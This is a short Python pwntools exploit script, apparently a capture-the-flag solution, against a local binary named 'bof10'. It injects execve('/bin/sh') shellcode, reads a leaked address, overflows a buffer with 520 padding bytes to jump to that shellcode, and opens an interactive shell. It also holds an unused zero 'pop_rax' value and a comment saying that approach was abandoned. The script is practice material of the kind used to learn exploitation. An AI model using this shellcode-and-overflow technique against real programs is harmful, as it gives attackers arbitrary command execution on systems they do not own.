#!/bin/python3
from pwn import *
exe = ELF('./bof10')
shellcode = asm('''
    mov rax,0x3b 
    mov rdi, 29400045130965551
    push rdi 
    mov rdi, rsp 
    xor rsi, rsi 
    xor rdx,rdx
       syscall
                ''', arch='amd64')
p = process(exe.path)
input()
p.sendlineafter(b'Your name: ', shellcode)
p.recvline()
p.recvline()
p.recvuntil(b'I have a gift for you: ')
char1_leak = int(p.recvline(),16)
log.info("char1_leak: " + hex(char1_leak))
payload = b'A'*520
payload += p64(char1_leak)
pop_rax = 0x0000000000000
p.sendlineafter(b'Say something:',payload)
#notes: with no pop_rax address, we can do nothing =))))

p.interactive()

